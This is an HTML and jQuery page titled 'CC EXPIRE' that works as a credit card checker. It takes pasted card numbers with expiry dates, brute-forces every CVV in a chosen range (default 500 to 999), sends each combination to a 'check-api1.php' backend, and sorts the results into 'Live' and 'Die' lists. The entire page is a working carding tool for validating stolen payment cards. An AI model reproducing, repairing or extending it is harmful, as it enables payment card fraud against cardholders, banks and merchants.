<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script src="jq.js"></script>
<script>

$(document).ready(function (){
	$('#work').hide();
	$('#results').hide();
	$('#button2').click(function(){

		$('#button2').hide();
		$('#resdie').html('');
		$('#results').fadeIn(2000);
		$('#work').fadeIn(2000);
		var stat = $('#start').val();
		var end = $('#end').val();
		var mystr = $('#users').val();
		var myarr = mystr.split("\n");
		var num = 0;
		var nownum =0;
		var livenum = 0;
		var dienum = 0;
		$('#livenum').html(livenum);
		$('#dienum').html(dienum);
		$('#tnum').html(num);

		for (j = stat ; j <= end; j++) {

		for (i = 0; i < myarr.length; i++) {
      myar = (myarr[i]+"|"+j.toString().padStart(3, "0"));

		$.post("check-api1.php?card="+myar+"&type"+$( "#type option:selected" ).text(), function(result){
			num++;
			$('#tnum').html(num);
var myMatch = result.search('Good');
if(myMatch != -1)
{
	livenum++;
	$('#livenum').html(livenum);
$( "#reslive" ).append('<span class="marks">'+myarr.length+'|'+num + ' = </span>' + result);

}
else
{
	dienum++;
	$('#dienum').html(dienum);
$( "#resdie" ).append('<span class="marks">'+myarr.length+'|'+num + ' = </span>' + result);

}




    });
}
}

		});


	});
</script>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>CC EXPIRE</title>
<style type="text/css">
<!--

.formss{
color:#F00;
background-color:#609;
font-family:Tahoma, Geneva, sans-serif;
}
.markss{
color:#F00;
font-family:Tahoma, Geneva, sans-serif;
font-size:12px;

text-decoration:none;

}
.asd {
	color: #F00;

	font-size:13px;
}
.asds {
	color: #0F0;

	font-size:13px;
}
-->
</style>
<link href="new.css" rel="stylesheet" type="text/css" />
</head>

<body>

<table width="978" height="432" border="0" align="center">
    <tr>
      <td height="82" align="center" class="title"> Checker</td>
    </tr>
    <tr>
      <td width="968" height="137" align="center" ><p class="markss"><span class="marks">Welcome to  Checker</span></p>
        <p class="marks">NUM|MONTH(09)|YEAR(2018)|CVV</p>
      <p class="marksc">VISA | MasterCard | AMEX</p>
                    <div class="col-sm-2" >
      <label for="bin" class="col-sm-1 control-label">start with: </label>
                        <input type="text" class="form-control" id="start" name="start" value="500">
                    <label for="bin" class="col-sm-1 control-label">end with: </label>
                        <input type="text" class="form-control" id="end" name="end" value="999">
                    </div>
      </td>
    </tr>
    <tr>
      <td height="82" align="center"><table width="545" border="0" align="center">
        <tr>
          <td width="539" align="center"><label for="users"></label>
            <textarea name="users" cols="150" rows="10" class="css_input2" id="users"></textarea></td>
        </tr>
        <tr>
          <td align="center"><input name="button2" type="submit" class="css_input2" id="button2" value="Check" />
            <img src="loading.gif" alt="" width="44" height="44" id="work"/></td>
        </tr>
      </table></td>
  </tr>
  </table>
  <p>&nbsp;</p>
<p>&nbsp;</p>
<table width="1096" height="117" border="0" align="center" class="css_input1" id='results'>
    <tr>
      <td height="21" align="center" bgcolor="#FFFFFF" style="text-align: left"><table width="192" border="0" align="center" cellpadding="0" cellspacing="0">
        <tbody>
          <tr>
            <td width="62" align="center">Live</td>
            <td width="67" align="center">Die</td>
            <td width="63" align="center">Total</td>
          </tr>
          <tr>
            <td align="center"><span id='livenum' class="markss1"></span></td>
            <td align="center"><span id='dienum' class="markss"></span></td>
            <td align="center"><span id='tnum' class="marks"></span></td>
          </tr>
        </tbody>
      </table></td>
  </tr>
    <tr>
      <td height="21" align="center" bgcolor="#E4E3E3" style="text-align: left"><span class="text1">Result :</span> <span class="markss1">LIVE</span></td>
    </tr>
    <tr>
      <td height="21" align="center" bgcolor="#F3FFF8" id="reslive" style="text-align: left"></td>
    </tr>
    <tr>
      <td width="1088" height="21" align="center" bgcolor="#E4E3E3" style="text-align: left"><span class="text1">Result :</span> <span class="markss">DIE </span></td>
    </tr>
    <tr>
      <td height="21" align="center" bgcolor="#FFF8F8" id="resdie" style="text-align: left"></td>
    </tr>
</table>
</body>
</html>
